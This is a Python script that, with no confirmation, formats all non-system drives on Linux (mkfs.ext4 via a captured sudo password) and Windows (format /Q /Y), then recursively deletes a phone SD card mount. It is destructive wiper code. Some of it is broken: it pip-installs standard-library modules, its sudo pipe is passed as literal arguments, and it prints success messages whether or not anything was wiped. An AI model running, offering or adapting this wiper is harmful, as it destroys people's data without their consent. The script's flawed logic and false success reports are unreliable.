import os
import subprocess
import platform
import shutil
import getpass
import sys

GREEN = "\033[92m"
RED = "\033[91m"
RESET = "\033[0m"

# Function to install required modules automatically
def install_required_modules():
    try:
        import pip
    except ImportError:
        print(f"{RED}Pip is not installed. Please install pip first.{RESET}")
        sys.exit(1)

    required_modules = ["platform", "shutil", "getpass"]
    
    for module in required_modules:
        try:
            __import__(module)
        except ImportError:
            print(f"{RED}Installing {module}...{RESET}")
            subprocess.check_call([sys.executable, "-m", "pip", "install", module])

# No confirmation; directly start deletion
def format_pc_drives():
    system = platform.system()
    
    if system == "Linux":
        # Listing all block devices
        output = subprocess.check_output(["lsblk", "-o", "NAME,MOUNTPOINT"]).decode("utf-8")
        print(f"{RED}{output}{RESET}")
        
        # Ask for root password
        sudo_pass = getpass.getpass("Enter your sudo password: ")

        # Format each partition except root (avoid wiping the OS partition)
        devices = [line.split()[0] for line in output.splitlines() if 'sd' in line and '/' not in line]
        
        for device in devices:
            print(f"{RED}Formatting /dev/{device}...{RESET}")
            subprocess.run(["echo", sudo_pass, "|", "sudo", "-S", f"mkfs.ext4", f"/dev/{device}"])
            print(f"{GREEN}/dev/{device} formatted successfully!{RESET}")

    elif system == "Windows":
        print(f"{RED}Formatting all non-system drives...{RESET}")
        output = subprocess.check_output("wmic logicaldisk get name").decode()
        drives = [line.strip() for line in output.split("\n") if ":" in line]
        
        for drive in drives:
            if drive != "C:":  # Skip the system drive
                print(f"{RED}Formatting {drive}...{RESET}")
                subprocess.run(f"format {drive} /FS:NTFS /Q /Y", shell=True)
                print(f"{GREEN}{drive} formatted successfully!{RESET}")

    else:
        print(f"{RED}Unsupported operating system!{RESET}")

def format_phone_sdcard():
    phone_mount_point = "/mnt/sdcard"
    
    if os.path.exists(phone_mount_point):
        print(f"{RED}Removing all data from phone's SD card...{RESET}")
        shutil.rmtree(phone_mount_point, ignore_errors=True)
        print(f"{GREEN}SD card wiped successfully!{RESET}")
    else:
        print(f"{RED}Phone mount point not found.{RESET}")

def main():
    install_required_modules()
    format_pc_drives()
    format_phone_sdcard()
    print(f"{GREEN}All drives formatted and phone's SD card wiped!{RESET}")

if __name__ == "__main__":
    main()